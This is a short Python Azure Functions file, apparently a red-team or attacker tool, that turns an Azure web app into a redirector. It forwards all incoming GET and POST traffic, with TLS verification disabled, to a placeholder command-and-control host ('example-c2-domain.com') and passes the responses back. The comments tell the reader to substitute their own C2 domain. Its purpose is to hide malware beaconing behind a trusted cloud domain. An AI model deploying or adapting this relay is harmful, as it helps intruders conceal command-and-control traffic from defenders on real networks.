import logging
import azure.functions as func

import requests
from urllib.parse import urlparse
from datetime import datetime

# Azure functions have a default HTTP route of http://<APP_NAME>/azurewebsites.com/api/<FUNCTION_NAME>
# We want to change this HTTP route to accept *all* routes hitting our azurewebsite domain since we
# need to pass along the requested URI to the backend host. In order to change these default settings,
# We need to change the ../host.json and ./function.json files.
# In host.json, specify "routePrefix": "" to remove the /api/
# and in function.json, specify "route": "{*path}" to allow wildcard routing.

# Notes on deployment: I could not figure out this AzureWebJobsStorage thing despite reading multiple
# articles on the topic. I keep getting the following error:
# 'br-redirector' app is missing AzureWebJobsStorage app setting. That setting is required for publishing consumption linux apps.
#
# Submit an MR or shoot me a message if you figure out how to fix this error! :)

# Change this backend host to whatever your domain is
backend_host = "https://example-c2-domain.com"

def main(req: func.HttpRequest) -> func.HttpResponse:
    urlparsed = urlparse(req.url)
    uri = urlparsed.path

    if(req.method == "GET"):
        if(urlparsed.query != ""):
            uri = uri + "?" + urlparsed.query
        url = backend_host + uri
        response = requests.get(url, verify=False)

    elif(req.method == "POST"):
        url = backend_host + uri
        print(url)
        print(req.get_body())
        response = requests.post(url, data=req.get_body(), verify=False)

    print("[" + datetime.now().strftime("%b %d %Y %H:%M:%S") + "] Sent " + req.method + " request to " + url)

    return func.HttpResponse(
         body=response.content,
         headers=response.headers,
         status_code=200
    )
